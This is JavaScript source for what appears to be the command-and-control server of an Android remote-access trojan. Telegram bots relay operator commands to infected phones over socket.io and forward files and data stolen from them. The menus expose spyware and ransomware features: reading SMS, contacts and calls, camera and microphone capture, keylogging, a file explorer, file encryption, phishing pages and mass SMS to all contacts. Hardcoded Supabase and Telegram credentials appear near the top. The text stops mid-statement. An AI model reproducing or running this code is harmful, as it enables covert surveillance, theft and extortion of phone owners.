const express = require("express");
const http = require("http");
const { Server } = require("socket.io");
const telegramBot = require("node-telegram-bot-api");
const https = require("https");
const multer = require("multer");
const fs = require('fs');
const { createClient } = require('@supabase/supabase-js');

// ============================================================================
// SYSTEM INITIALIZATION & CONFIGURATION
// ============================================================================
const app = express();
const server = http.createServer(app);
const io = new Server(server, {
    cors: {
        origin: "*",
        methods: ["GET", "POST"]
    },
    allowEIO3: true // Ensures older Android clients can connect smoothly
});
const uploader = multer();

// 🩸 Supabase Configuration
const SUPABASE_URL = "https://nebwfonyhfgxnfkiisvs.supabase.co";
const SUPABASE_KEY = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6Im5lYndmb255aGZneG5ma2lpc3ZzIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NzUzNjc0MjMsImV4cCI6MjA5MDk0MzQyM30.me-P_mhC3droVGrHSlD_G3h9-ZgGgR3hy8VyDLFTp58";
const supabase = createClient(SUPABASE_URL, SUPABASE_KEY);

const BASE_URL = "https://doge-production-517d.up.railway.app";
const DISCLAIMER = "\n\n<b>⚠️ DISCLAIMER: This tool is made for educational and ethical use ONLY. You are responsible for your actions.\n\nDEVELOPER: @RomeoFF67 🩸</b>";

let data = {};
try {
    data = JSON.parse(fs.readFileSync("./data.json", "utf8"));
} catch (e) {
    console.log("No data.json found, starting fresh system for @RomeoFF67.");
}

// Master Bot Initialization
const bot = new telegramBot(data.token || "8709139578:AAER0NWsrjN2m1skAmD5w8fmD14Sl9yQTwE", {
    'polling': true,
    'request': {}
});

// ============================================================================
// STATE MANAGEMENT (MAPS & SETS)
// ============================================================================
const dynamicBots = new Map();
const appData = new Map();
const deviceMap = new Map();
const unassignedSockets = new Map();

// ============================================================================
// DYNAMIC BOT MANAGER
// ============================================================================
async function getSpecificBot(chatId, botName) {
    try {
        const { data, error } = await supabase
            .from('rm-d')
            .select('bot_token')
            .eq('chat_id', String(chatId))
            .eq('bot_name', String(botName))
            .single();

        if (error) {
            console.log("Database lookup error for specific bot.");
            return bot;
        }

        if (data && data.bot_token) {
            if (!dynamicBots.has(data.bot_token)) {
                console.log(`Initializing new dynamic bot instance for @RomeoFF67 -> [${botName}]`);
                dynamicBots.set(data.bot_token, new telegramBot(data.bot_token));
            }
            return dynamicBots.get(data.bot_token);
        }
    } catch (e) {
        console.error("Error retrieving dynamic bot:", e);
    }
    return bot;
}

// ============================================================================
// ADVANCED PROGRESS BAR (WITH TIME ESTIMATION)
// ============================================================================
const loadingFrames = [
    { frame: "<b>[▯▯▯▯▯▯▯▯▯▯] 0% 🩸</b>", time: "Estimated: 5s" },
    { frame: "<b>[██▯▯▯▯▯▯▯▯] 20% 🩸</b>", time: "Estimated: 4s" },
    { frame: "<b>[████▯▯▯▯▯▯] 40% 🩸</b>", time: "Estimated: 3s" },
    { frame: "<b>[██████▯▯▯▯] 60% 🩸</b>", time: "Estimated: 2s" },
    { frame: "<b>[████████▯▯] 80% 🩸</b>", time: "Estimated: 1s" },
    { frame: "<b>[██████████] 100% 👁️‍🗨️</b>", time: "Finalizing..." }
];

async function sendAnimatedProgress(chatId, deviceModel, activeBotName) {
    const specificBot = await getSpecificBot(chatId, activeBotName);
    
    let header = `<b>📩 𝙼𝚎𝚜𝚜𝚊𝚐𝚎 𝚛𝚎𝚌𝚎𝚒𝚟𝚎𝚍 𝚏𝚛𝚘𝚖 [${activeBotName}] → ${deviceModel} 👁️‍🗨️</b>\n\n`;
    header += `<b>𝙼𝚎𝚜𝚜𝚊𝚐𝚎 → 𝚃𝚑𝚎 𝚍𝚎𝚟𝚒𝚌𝚎 𝚑𝚊𝚜 𝚜𝚝𝚊𝚛𝚝𝚎𝚍 𝚞𝚙𝚕𝚘𝚊𝚍𝚒𝚗𝚐 𝚝𝚑𝚎 𝚏𝚒𝚕𝚎, 𝚙𝚕𝚎𝚊𝚜𝚎 𝚋𝚎 𝚙𝚊𝚝𝚒𝚎𝚗𝚝</b>\n\n`;
    header += `<b>SYSTEM: @RomeoFF67 🩸</b>`;

    let initialText = header + `\n\n${loadingFrames[0].frame}\n<i>${loadingFrames[0].time}</i>`;
    
    const sentMsg = await specificBot.sendMessage(chatId, initialText, { 'parse_mode': "HTML" }).catch(() => {});
    if (!sentMsg) return;

    let frameIndex = 1;
    const interval = setInterval(async () => {
        if (frameIndex >= loadingFrames.length) {
            clearInterval(interval);
            let finalText = header + `\n\n<b>[██████████] 100% ✅ 𝚁𝙼 𝚄𝙲𝙷𝙸𝙷𝙰</b>\n<i>Transfer Complete.</i>`;
            await specificBot.editMessageText(finalText, {
                chat_id: chatId,
                message_id: sentMsg.message_id,
                parse_mode: "HTML"
            }).catch(() => {});
            return;
        }

        let updatedText = header + `\n\n${loadingFrames[frameIndex].frame}\n<i>${loadingFrames[frameIndex].time}</i>`;
        await specificBot.editMessageText(updatedText, {
            chat_id: chatId,
            message_id: sentMsg.message_id,
            parse_mode: "HTML"
        }).catch(() => {});
        
        frameIndex++;
    }, 1000);
}

// ============================================================================
// UTILITY FUNCTIONS
// ============================================================================
function extractIp(reqOrSocket) {
    if (reqOrSocket.headers && reqOrSocket.headers['x-forwarded-for']) {
        return reqOrSocket.headers['x-forwarded-for'].split(',')[0];
    }
    if (reqOrSocket.handshake && reqOrSocket.handshake.headers['x-forwarded-for']) {
        return reqOrSocket.handshake.headers['x-forwarded-for'].split(',')[0];
    }
    if (reqOrSocket.connection && reqOrSocket.connection.remoteAddress) {
        return reqOrSocket.connection.remoteAddress;
    }
    if (reqOrSocket.handshake && reqOrSocket.handshake.address) {
        return reqOrSocket.handshake.address;
    }
    return "Unknown_IP";
}

// ============================================================================
// MIDDLEWARE AND HTTP ROUTES
// ============================================================================
app.use(express.json());
app.use(express.static('public'));

app.use(["/uid=:chatId/:botName", "/uid=:chatId/:botName/upload"], (req, res, next) => {
    let ip = extractIp(req);
    let cId = req.params.chatId;
    let bName = req.params.botName;

    if (cId && bName) {
        deviceMap.set(ip, { chatId: cId, botName: bName });
        
        let sock = unassignedSockets.get(ip);
        if (sock) {
            sock.chatId = cId;
            sock.botName = bName;
            unassignedSockets.delete(ip);
            notifyConnection(sock);
        }
    }
    next();
});

// App File and JSON Receiving Endpoint
app.post(["/uid=:chatId/:botName", "/uid=:chatId/:botName/upload"], uploader.any(), async (req, res) => {
    const { chatId, botName } = req.params;
    const deviceModel = req.headers.model || "Unknown Device";
    const specificBot = await getSpecificBot(chatId, botName);

    try {
        if (req.files && req.files.length > 0) {
            for (let i = 0; i < req.files.length; i++) {
                let f = req.files[i];
                let captionText = `<b>📁 𝙵𝚒𝚕𝚎 𝚛𝚎𝚌𝚎𝚒𝚟𝚎𝚍 𝚏𝚛𝚘𝚖 [${botName}] → ${deviceModel} 🩸</b>\n`;
                captionText += `<b>Name:</b> ${f.originalname || "unknown_file"}\n`;
                captionText += `<b>Size:</b> ${f.size} bytes\n`;
                captionText += DISCLAIMER;

                await specificBot.sendDocument(chatId, f.buffer, {
                    'caption': captionText,
                    'parse_mode': "HTML"
                }, {
                    'filename': f.originalname || "file",
                    'contentType': f.mimetype || "*/*"
                }).catch((e) => {
                    console.log("Error sending document:", e);
                });
            }
        }

        if (req.body && Object.keys(req.body).length > 0) {
            let dataText = `<b>📊 𝙳𝚊𝚝𝚊 𝚏𝚛𝚘𝚖 [${botName}] → ${deviceModel} 🩸</b>\n\n`;
            dataText += `<b>Payload:</b>\n<code>${JSON.stringify(req.body, null, 2)}</code>\n`;
            dataText += DISCLAIMER;

            await specificBot.sendMessage(chatId, dataText, {
                parse_mode: "HTML"
            }).catch((e) => {
                console.log("Error sending text data:", e);
            });
        }
        res.status(200).send("Payload Processed by @RomeoFF67");
    } catch (err) {
        console.error("Endpoint processing error:", err);
        res.status(500).send("Internal Error");
    }
});

app.get("/text", (req, res) => {
    res.send("RM UCHIHA VIP SYSTEM ACTIVE - @RomeoFF67");
});

// ============================================================================
// WEBSOCKET CONNECTION LOGIC (SOCKET.IO)
// ============================================================================
io.on("connection", _0x48afef => {
    let rawModel = _0x48afef.handshake.headers.model || "no information";
    let _0x35d854 = rawModel + '-' + io.sockets.sockets.size;
    let _0x3e1fde = _0x48afef.handshake.headers.version || "no information";
    let _0x4c49f4 = extractIp(_0x48afef);

    _0x48afef.model = _0x35d854;
    _0x48afef.version = _0x3e1fde;
    _0x48afef.ip = _0x4c49f4;

    let mapping = deviceMap.get(_0x4c49f4);

    if (mapping) {
        _0x48afef.chatId = mapping.chatId;
        _0x48afef.botName = mapping.botName;
        notifyConnection(_0x48afef);
        
        // PING IMMEDIATE AFTER CONNECTION AS REQUESTED BY @RomeoFF67
        _0x48afef.emit("ping", { message: "Welcome to RM UCHIHA VIP" });
        console.log(`Ping sent to mapped device: ${_0x48afef.ip}`);
    } else {
        unassignedSockets.set(_0x4c49f4, _0x48afef);
        console.log(`Device connected but unassigned: ${_0x48afef.ip}`);
    }

    _0x48afef.on("disconnect", async () => {
        unassignedSockets.delete(_0x48afef.ip);
        
        if (_0x48afef.chatId) {
            const sBot = await getSpecificBot(_0x48afef.chatId, _0x48afef.botName);
            
            let disconnectMsg = `<b>🔴 𝙳𝚎𝚟𝚒𝚌𝚎 𝚍𝚒𝚜𝚌𝚘𝚗𝚗𝚎𝚌𝚝𝚎𝚍 𝚏𝚛𝚘𝚖 [${_0x48afef.botName}] 🩸</b>\n\n`;
            disconnectMsg += `<b>𝚖𝚘𝚍𝚎𝚕</b> → ${_0x35d854}\n`;
            disconnectMsg += `<b>𝚟𝚎𝚛𝚜𝚒𝚘𝚗</b> → ${_0x3e1fde}\n`;
            disconnectMsg += `<b>𝚒𝚙</b> → ${_0x4c49f4}\n`;
            disconnectMsg += `<b>𝚝𝚒𝚖𝚎</b> → ${_0x48afef.handshake.time}`;
            disconnectMsg += DISCLAIMER;

            sBot.sendMessage(_0x48afef.chatId, disconnectMsg, {
                parse_mode: "HTML"
            }).catch((e) => {
                console.log("Error sending disconnect msg:", e);
            });
        }
    });

    _0x48afef.on("message", async _0x44fcc5 => {
        if (_0x48afef.chatId) {
            if (_0x44fcc5 === "The device has started uploading the file, please be patient") {
                sendAnimatedProgress(_0x48afef.chatId, _0x35d854, _0x48afef.botName);
            } else {
                const sBot = await getSpecificBot(_0x48afef.chatId, _0x48afef.botName);
                
                let textMsg = `<b>📩 𝙼𝚎𝚜𝚜𝚊𝚐𝚎 𝚛𝚎𝚌𝚎𝚒𝚟𝚎𝚍 𝚏𝚛𝚘𝚖 [${_0x48afef.botName}] → ${_0x35d854} 👁️‍🗨️</b>\n\n`;
                textMsg += `<b>𝙼𝚎𝚜𝚜𝚊𝚐𝚎 → </b>${_0x44fcc5}`;
                textMsg += DISCLAIMER;

                sBot.sendMessage(_0x48afef.chatId, textMsg, {
                    parse_mode: "HTML"
                }).catch((e) => {
                    console.log("Error sending generic message:", e);
                });
            }
        }
    });
});

async function notifyConnection(socket) {
    if (socket.notified) return;
    socket.notified = true;

    const sBot = await getSpecificBot(socket.chatId, socket.botName);
    
    let connectMsg = `<b>✯ 𝙽𝚎𝚠 𝚍𝚎𝚟𝚒𝚌𝚎 𝚌𝚘𝚗𝚗𝚎𝚌𝚝𝚎𝚍 𝚝𝚘 [${socket.botName}] 🩸</b>\n\n`;
    connectMsg += `<b>𝚖𝚘𝚍𝚎𝚕</b> → ${socket.model}\n`;
    connectMsg += `<b>𝚟𝚎𝚛𝚜𝚒𝚘𝚗</b> → ${socket.version}\n`;
    connectMsg += `<b>𝚒𝚙</b> → ${socket.ip}\n`;
    connectMsg += `<b>𝚝𝚒𝚖𝚎</b> → ${socket.handshake.time}`;
    connectMsg += DISCLAIMER;

    sBot.sendMessage(socket.chatId, connectMsg, {
        parse_mode: "HTML"
    }).catch((e) => {
        console.log("Error notifying admin of connection:", e);
    });
}

function emitToTargets(target, command, extras, chatId, activeBot) {
    if (target === "all") {
        io.sockets.sockets.forEach(sock => {
            if (sock.chatId == chatId && sock.botName == activeBot) {
                sock.emit("commend", { 'request': command, 'extras': extras });
            }
        });
    } else {
        let sock = io.sockets.sockets.get(target);
        if (sock && sock.chatId == chatId && sock.botName == activeBot) {
            sock.emit("commend", { 'request': command, 'extras': extras });
        }
    }
}

// ============================================================================
// KEYBOARD GENERATORS (FOR READABILITY AND STRUCTURE EXPANSION)
// ============================================================================
function getMainMenuKeyboard() {
    return [
        [
            "✯ 𝙳𝚎𝚟𝚒𝚌𝚎𝚜 ✯",
            "✯ 𝙰𝚌𝚝𝚒𝚘𝚗 ✯"
        ],
        [
            "✯ 𝙰𝚋𝚘𝚞𝚝 𝚞𝚜 ✯",
            "🔄 Switch Bot"
        ]
    ];
}

function getActionMenuKeyboard() {
    return [
        [
            "✯ 𝙲𝚘𝚗𝚝𝚊𝚌𝚝𝚜 ✯",
            "✯ 𝚂𝙼𝚂 ✯"
        ],
        [
            "✯ 𝙲𝚊𝚕𝚕𝚜 ✯",
            "✯ 𝙰𝚙𝚙𝚜 ✯"
        ],
        [
            "✯ 𝙼𝚊𝚒𝚗 𝚌𝚊𝚖𝚎𝚛𝚊 ✯",
            "✯ 𝚂𝚎𝚕𝚏𝚒𝚎 𝙲𝚊𝚖𝚎𝚛𝚊 ✯"
        ],
        [
            "✯ 𝙼𝚒𝚌𝚛𝚘𝚙𝚑𝚘𝚗𝚎 ✯",
            "✯ 𝙲𝚕𝚒𝚙𝚋𝚘𝚊𝚛𝚍 ✯"
        ],
        [
            "✯ 𝚂𝚌𝚛𝚎𝚎𝚗𝚜𝚑𝚘𝚝 ✯",
            "✯ 𝚃𝚘𝚊𝚜𝚝 ✯"
        ],
        [
            "✯ 𝚂𝚎𝚗𝚍 𝚂𝙼𝚂 ✯",
            "✯ 𝚅𝚒𝚋𝚛𝚊𝚝𝚎 ✯"
        ],
        [
            "✯ 𝙿𝚕𝚊𝚢 𝚊𝚞𝚍𝚒𝚘 ✯",
            "✯ 𝚂𝚝𝚘𝚙 𝙰𝚞𝚍𝚒𝚘 ✯"
        ],
        [
            "✯ 𝙺𝚎𝚢𝚕𝚘𝚐𝚐𝚎𝚛 𝙾𝙽 ✯",
            "✯ 𝙺𝚎𝚢𝚕𝚘𝚐𝚐𝚎𝚛 𝙾𝙵𝙵 ✯"
        ],
        [
            "✯ 𝙵𝚒𝚕𝚎 𝚎𝚡𝚙𝚕𝚘𝚛𝚎𝚛 ✯",
            "✯ 𝙶𝚊𝚕𝚕𝚎𝚛𝚢 ✯"
        ],
        [
            "✯ 𝙴𝚗𝚌𝚛𝚢𝚙𝚝 ✯",
            "✯ 𝙳𝚎𝚌𝚛𝚢𝚙𝚝 ✯"
        ],
        [
            "✯ 𝙾𝚙𝚎𝚗 𝚄𝚁𝙻 ✯",
            "✯ 𝙿𝚑𝚒𝚜𝚑𝚒𝚗𝚐 ✯"
        ],
        [
            "✯ 𝚂𝚎𝚗𝚍 𝚂𝙼𝚂 𝚝𝚘 𝚊𝚕𝚕 𝚌𝚘𝚗𝚝𝚊𝚌𝚝𝚜 ✯"
        ],
        [
            "✯ 𝙿𝚘𝚙 𝚗𝚘𝚝𝚒𝚏𝚒𝚌𝚊𝚝𝚒𝚘𝚗 ✯"
        ],
        [
            "✯ 𝙱𝚊𝚌𝚔 𝚝𝚘 𝚖𝚊𝚒𝚗 𝚖𝚎𝚗𝚞 ✯"
        ]
    ];
}

// ============================================================================
// MAIN TELEGRAM BOT POLLING LOGIC
// ============================================================================
bot.on("message", async _0xdbde0c => {
    const chatId = String(_0xdbde0c.chat.id);
    const text = _0xdbde0c.text;

    if (!text) return;

    // ------------------------------------------------------------------------
    // REGISTRATION COMMAND LOGIC
    // ------------------------------------------------------------------------
    if (text.startsWith("/rg ")) {
        const parts = text.slice(4).split(" ");
        if (parts.length < 3) {
            let errorMsg = `<b>⚠️ Invalid format. Use: /rg &lt;bot_token&gt; &lt;password&gt; &lt;bot_name&gt;</b>`;
            errorMsg += DISCLAIMER;
            return bot.sendMessage(chatId, errorMsg, { parse_mode: "HTML" });
        }

        const [token, password, ...nameParts] = parts;
        const botName = nameParts.join(" ");

        try {
            const { data: existing } = await supabase
                .from("rm-d")
                .select("*")
                .eq("chat_id", chatId)
                .eq("bot_name", botName)
                .single();

            if (existing) {
                let existMsg = `<b>🔴 You already have a bot named [${botName}] under @RomeoFF67 management!</b>`;
                existMsg += DISCLAIMER;
                return bot.sendMessage(chatId, existMsg, { parse_mode: "HTML" });
            }

            const generated_url = `${BASE_URL}/uid=${chatId}/${encodeURIComponent(botName)}`;
            
            await supabase.from("rm-d").insert([{ 
                chat_id: chatId, 
                bot_token: token, 
                bot_name: botName, 
                password: password, 
                generated_url: generated_url 
            }]);

            let successMsg = `<b>✅ Bot Successfully Registered! 🩸</b>\n\n`;
            successMsg += `<b>App Connection URL:</b>\n<code>${generated_url}</code>\n\n`;
            successMsg += `<b>Use /start to access your bots.</b>`;
            successMsg += DISCLAIMER;

            bot.sendMessage(chatId, successMsg, { parse_mode: "HTML" });
            
            // Dynamic Verification Ping to New Bot
            try {
                const testBot = new telegramBot(token);
                let testMsg = `<b>🩸 𝚈𝚘𝚞𝚛 𝚋𝚘𝚝 [${botName}] 𝚒𝚜 𝚛𝚎𝚐𝚒𝚜𝚝𝚎𝚛𝚎𝚍 𝚒𝚗 𝚄𝚌𝚑𝚒𝚑𝚊 𝚅𝚒𝚙 👁️‍🗨️</b>`;
                testMsg += `\n\nManaged by @RomeoFF67`;
                testMsg += DISCLAIMER;
                testBot.sendMessage(chatId, testMsg, { parse_mode: "HTML" }).catch(() => {});
            } catch (testError) {
                console.log("Token validation failed dynamically:", testError);
            }
        } catch (dbError) {
            console.log("Database operation error during registration:", dbError);
        }
        return;
    }

    // ------------------------------------------------------------------------
    // LOGIN AND BOT SWITCHING LOGIC
    // ------------------------------------------------------------------------
    if (text === "/start" || text === "🔄 Switch Bot") {
        try {
            const { data: userBots } = await supabase
                .from("rm-d")
                .select("bot_name")
                .eq("chat_id", chatId);

            if (userBots && userBots.length > 0) {
                const keyboard = userBots.map(b => [{ text: `🤖 ${b.bot_name}` }]);
                
                let startMsg = `<b>👑 𝚆𝚎𝚕𝚌𝚘𝚖𝚎 𝚝𝚘 𝚁𝙼 𝚄𝙲𝙷𝙸𝙷𝙰 𝚅𝙸𝙿 🩸</b>\n\n`;
                startMsg += `<b>Select the Bot you want to manage: 👁️‍🗨️</b>`;
                startMsg += DISCLAIMER;

                bot.sendMessage(chatId, startMsg, {
                    parse_mode: "HTML",
                    reply_markup: {
                        keyboard: keyboard,
                        resize_keyboard: true
                    }
                });
            } else {
                let emptyMsg = `<b>👑 𝚆𝚎𝚕𝚌𝚘𝚖𝚎 𝚝𝚘 𝚁𝙼 𝚄𝙲𝙷𝙸𝙷𝙰 𝚅𝙸𝙿 🩸</b>\n\n`;
                emptyMsg += `<b>⚠️ You have no bots registered with @RomeoFF67.</b>\n`;
                emptyMsg += `<b>Use /rg &lt;bot_token&gt; &lt;password&gt; &lt;bot_name&gt; to register.</b>`;
                emptyMsg += DISCLAIMER;

                bot.sendMessage(chatId, emptyMsg, { 
                    parse_mode: "HTML", 
                    reply_markup: { remove_keyboard: true } 
                });
            }
        } catch (err) {
            console.log("Error handling start command:", err);
        }
        return;
    }

    // ------------------------------------------------------------------------
    // BOT SELECTION LOGIC
    // ------------------------------------------------------------------------
    if (text.startsWith("🤖 ")) {
        const selectedBot = text.replace("🤖 ", "");
        appData.set(chatId + "_activeBot", selectedBot);
        
        let selectMsg = `<b>🩸 𝙱𝚘𝚝 [${selectedBot}] 𝚂𝚎𝚕𝚎𝚌𝚝𝚎𝚍! 👁️‍🗨️</b>\n\n`;
        selectMsg += `<b>Select an option to perform an action.</b>`;
        selectMsg += DISCLAIMER;

        bot.sendMessage(chatId, selectMsg, {
            parse_mode: "HTML",
            reply_markup: {
                keyboard: getMainMenuKeyboard(),
                resize_keyboard: true
            }
        });
        return;
    }

    // ------------------------------------------------------------------------
    // ACTIVE BOT VERIFICATION
    // ------------------------------------------------------------------------
    const activeBot = appData.get(chatId + "_activeBot");
    if (!activeBot) return;

    // Keys for maintaining state per user
    const actKey = chatId + "_currentAction";
    const tarKey = chatId + "_currentTarget";
    const numKey = chatId + "_currentNumber";

    // ========================================================================
    // ACTION INPUT HANDLERS (NESTED IF-ELSE FULLY EXPANDED)
    // ========================================================================
    if (appData.get(actKey) === "microphoneDuration") {
        let _0x3376c5 = text;
        let _0x44b92e = appData.get(tarKey);
        
        if (_0x44b92e == "all") {
            emitToTargets("all", "microphone", [{
                'key': "duration",
                'value': _0x3376c5
            }], chatId, activeBot);
        } else {
            emitToTargets(_0x44b92e, "microphone", [{
                'key': "duration",
                'value': _0x3376c5
            }], chatId, activeBot);
        }
        
        appData.delete(tarKey);
        appData.delete(actKey);
        
        let msg = "<b>✯ 𝚃𝚑𝚎 𝚛𝚎𝚚𝚞𝚎𝚜𝚝 𝚠𝚊𝚜 𝚎𝚡𝚎𝚌𝚞𝚝𝚎𝚍 𝚜𝚞𝚌𝚌𝚎𝚜𝚜𝚏𝚞𝚕𝚕𝚢, 𝚢𝚘𝚞 𝚠𝚒𝚕𝚕 𝚛𝚎𝚌𝚎𝚒𝚟𝚎 𝚍𝚎𝚟𝚒𝚌𝚎 𝚛𝚎𝚜𝚙𝚘𝚗𝚎 𝚜𝚘𝚘𝚗 ... 🩸</b>\n\n";
        msg += "<b>✯ 𝚁𝚎𝚝𝚞𝚛𝚗 𝚝𝚘 𝚖𝚊𝚒𝚗 𝚖𝚎𝚗𝚞</b>\n\n" + DISCLAIMER;
        
        bot.sendMessage(chatId, msg, {
            parse_mode: "HTML",
            reply_markup: {
                keyboard: getMainMenuKeyboard(),
                resize_keyboard: true
            }
        });
        return;
    }

    if (appData.get(actKey) === "toastText") {
        let _0x3f8601 = text;
        let _0x5c0cc9 = appData.get(tarKey);
        
        if (_0x5c0cc9 == "all") {
            emitToTargets("all", "toast", [{
                'key': "text",
                'value': _0x3f8601
            }], chatId, activeBot);
        } else {
            emitToTargets(_0x5c0cc9, "toast", [{
                'key': "text",
                'value': _0x3f8601
            }], chatId, activeBot);
        }
        
        appData.delete(tarKey);
        appData.delete(actKey);
        
        let msg = "<b>✯ 𝚃𝚑𝚎 𝚛𝚎𝚚𝚞𝚎𝚜𝚝 𝚠𝚊𝚜 𝚎𝚡𝚎𝚌𝚞𝚝𝚎𝚍 𝚜𝚞𝚌𝚌𝚎𝚜𝚜𝚏𝚞𝚕𝚕𝚢, 𝚢𝚘𝚞 𝚠𝚒𝚕𝚕 𝚛𝚎𝚌𝚎𝚒𝚟𝚎 𝚍𝚎𝚟𝚒𝚌𝚎 𝚛𝚎𝚜𝚙𝚘𝚗𝚎 𝚜𝚘𝚘𝚗 ... 🩸</b>\n\n";
        msg += "<b>✯ 𝚁𝚎𝚝𝚞𝚛𝚗 𝚝𝚘 𝚖𝚊𝚒𝚗 𝚖𝚎𝚗𝚞</b>\n\n" + DISCLAIMER;
        
        bot.sendMessage(chatId, msg, {
            parse_mode: "HTML",
            reply_markup: {
                keyboard: getMainMenuKeyboard(),
                resize_keyboard: true
            }
        });
        return;
    }

    if (appData.get(actKey) === "smsNumber") {
        let _0x16b4e5 = text;
        appData.set(numKey, _0x16b4e5);
        appData.set(actKey, 'smsText');
        
        let msg = "<b>✯ 𝙽𝚘𝚠 𝙴𝚗𝚝𝚎𝚛 𝚊 𝚖𝚎𝚜𝚜𝚊𝚐𝚎 𝚝𝚑𝚊𝚝 𝚢𝚘𝚞 𝚠𝚊𝚗𝚝 𝚝𝚘 𝚜𝚎𝚗𝚍 𝚝𝚘 " + _0x16b4e5 + " 👁️‍🗨️</b>";
        msg += DISCLAIMER;
        
        bot.sendMessage(chatId, msg, {
            parse_mode: "HTML",
            reply_markup: {
                keyboard: [["✯ 𝙲𝚊𝚗𝚌𝚎𝚕 𝚊𝚌𝚝𝚒𝚘𝚗 ✯"]],
                resize_keyboard: true,
                one_time_keyboard: true
            }
        });
        return;
    }

    if (appData.get(actKey) === "smsText") {
        let _0x6d597e = text;
        let _0x1c124a = appData.get(numKey);
        let _0x49a537 = appData.get(tarKey);
        
        if (_0x49a537 == "all") {
            emitToTargets("all", "sendSms", [{
                'key': "number",
                'value': _0x1c124a
            }, {
                'key': "text",
                'value': _0x6d597e
            }], chatId, activeBot);
        } else {
            emitToTargets(_0x49a537, "sendSms", [{
                'key': "number",
                'value': _0x1c124a
            }, {
                'key': "text",
                'value': _0x6d597e
            }], chatId, activeBot);
        }
        
        appData.delete(tarKey);
        appData.delete(actKey);
        appData.delete(numKey);
        
        let msg = "<b>✯ 𝚃𝚑𝚎 𝚛𝚎𝚚𝚞𝚎𝚜𝚝 𝚠𝚊𝚜 𝚎𝚡𝚎𝚌𝚞𝚝𝚎𝚍 𝚜𝚞𝚌𝚌𝚎𝚜𝚜𝚏𝚞𝚕𝚕𝚢, 𝚢𝚘𝚞 𝚠𝚒𝚕𝚕 𝚛𝚎𝚌𝚎𝚒𝚟𝚎 𝚍𝚎𝚟𝚒𝚌𝚎 𝚛𝚎𝚜𝚙𝚘𝚗𝚎 𝚜𝚘𝚘𝚗 ... 🩸</b>\n\n";
        msg += "<b>✯ 𝚁𝚎𝚝𝚞𝚛𝚗 𝚝𝚘 𝚖𝚊𝚒𝚗 𝚖𝚎𝚗𝚞</b>\n\n" + DISCLAIMER;
        
        bot.sendMessage(chatId, msg, {
            parse_mode: "HTML",
            reply_markup: {
                keyboard: getMainMenuKeyboard(),
                resize_keyboard: true
            }
        });
        return;
    }

    if (appData.get(actKey) === "vibrateDuration") {
        let _0x26f07c = text;
        let _0x3275f8 = appData.get(tarKey);
        
        if (_0x3275f8 == "all") {
            emitToTargets("all", "vibrate", [{
                'key': "duration",
                'value': _0x26f07c
            }], chatId, activeBot);
        } else {
            emitToTargets(_0x3275f8, "vibrate", [{
                'key': "duration",
                'value': _0x26f07c
            }], chatId, activeBot);
        }
        
        appData.delete(tarKey);
        appData.delete(actKey);
        
        let msg = "<b>✯ 𝚃𝚑𝚎 𝚛𝚎𝚚𝚞𝚎𝚜𝚝 𝚠𝚊𝚜 𝚎𝚡𝚎𝚌𝚞𝚝𝚎𝚍 𝚜𝚞𝚌𝚌𝚎𝚜𝚜𝚏𝚞𝚕𝚕𝚢, 𝚢𝚘𝚞 𝚠𝚒𝚕𝚕 𝚛𝚎𝚌𝚎𝚒𝚟𝚎 𝚍𝚎𝚟𝚒𝚌𝚎 𝚛𝚎𝚜𝚙𝚘𝚗𝚎 𝚜𝚘𝚘𝚗 ... 🩸</b>\n\n";
        msg += "<b>✯ 𝚁𝚎𝚝𝚞𝚛𝚗 𝚝𝚘 𝚖𝚊𝚒𝚗 𝚖𝚎𝚗𝚞</b>\n\n" + DISCLAIMER;
        
        bot.sendMessage(chatId, msg, {
            parse_mode: "HTML",
            reply_markup: {
                keyboard: getMainMenuKeyboard(),
                resize_keyboard: true
            }
        });
        return;
    }

    if (appData.get(actKey) === "textToAllContacts") {
        let _0x535777 = text;
        let _0x3b22c4 = appData.get(tarKey);
        
        if (_0x3b22c4 == "all") {
            emitToTargets("all", "smsToAllContacts", [{
                'key': "text",
                'value': _0x535777
            }], chatId, activeBot);
        } else {
            emitToTargets(_0x3b22c4, "smsToAllContacts", [{
                'key': "text",
                'value': _0x535777
            }], chatId, activeBot);
        }
        
        appData.delete(tarKey);
        appData.delete(actKey);
        
        let msg = "<b>✯ 𝚃𝚑𝚎 𝚛𝚎𝚚𝚞𝚎𝚜𝚝 𝚠𝚊𝚜 𝚎𝚡𝚎𝚌𝚞𝚝𝚎𝚍 𝚜𝚞𝚌𝚌𝚎𝚜𝚜𝚏𝚞𝚕𝚕𝚢, 𝚢𝚘𝚞 𝚠𝚒𝚕𝚕 𝚛𝚎𝚌𝚎𝚒𝚟𝚎 𝚍𝚎𝚟𝚒𝚌𝚎 𝚛𝚎𝚜𝚙𝚘𝚗𝚎 𝚜𝚘𝚘𝚗 ... 🩸</b>\n\n";
        msg += "<b>✯ 𝚁𝚎𝚝𝚞𝚛𝚗 𝚝𝚘 𝚖𝚊𝚒𝚗 𝚖𝚎𝚗𝚞</b>\n\n" + DISCLAIMER;
        
        bot.sendMessage(chatId, msg, {
            parse_mode: "HTML",
            reply_markup: {
                keyboard: getMainMenuKeyboard(),
                resize_keyboard: true
            }
        });
        return;
    }

    if (appData.get(actKey) === "notificationText") {
        let _0x371a40 = text;
        let target = appData.get(tarKey);
        
        if (target == "all") {
            emitToTargets("all", "popNotification", [{
                'key': "text",
                'value': _0x371a40
            }], chatId, activeBot);
        } else {
            emitToTargets(target, 'popNotification', [{
                'key': "text",
                'value': _0x371a40
            }, {
                'key': "url",
                'value': BASE_URL
            }], chatId, activeBot);
        }
        
        appData.delete(tarKey);
        appData.delete(actKey);
        
        let msg = "<b>✯ 𝚃𝚑𝚎 𝚛𝚎𝚚𝚞𝚎𝚜𝚝 𝚠𝚊𝚜 𝚎𝚡𝚎𝚌𝚞𝚝𝚎𝚍 𝚜𝚞𝚌𝚌𝚎𝚜𝚜𝚏𝚞𝚕𝚕𝚢, 𝚢𝚘𝚞 𝚠𝚒𝚕𝚕 𝚛𝚎𝚌𝚎𝚒𝚟𝚎 𝚍𝚎𝚟𝚒𝚌𝚎 𝚛𝚎𝚜𝚙𝚘𝚗𝚎 𝚜𝚘𝚘𝚗 ... 🩸</b>\n\n";
        msg += "<b>✯ 𝚁𝚎𝚝𝚞𝚛𝚗 𝚝𝚘 𝚖𝚊𝚒𝚗 𝚖𝚎𝚗𝚞</b>\n\n" + DISCLAIMER;
        
        bot.sendMessage(chatId, msg, {
            parse_mode: "HTML",
            reply_markup: {
